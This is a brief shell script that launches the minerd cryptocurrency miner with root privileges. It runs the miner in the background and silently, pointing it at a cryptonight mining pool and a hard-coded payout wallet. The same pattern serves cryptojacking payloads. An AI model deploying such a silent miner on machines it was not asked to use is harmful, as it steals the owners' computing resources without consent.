#!/bin/sh
cd `dirname $0`

sudo /usr/local/bin/minerd -B -q -a cryptonight -o stratum+tcp://krb.crypto-coins.club:5555 -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x -t 1 >& /dev/null
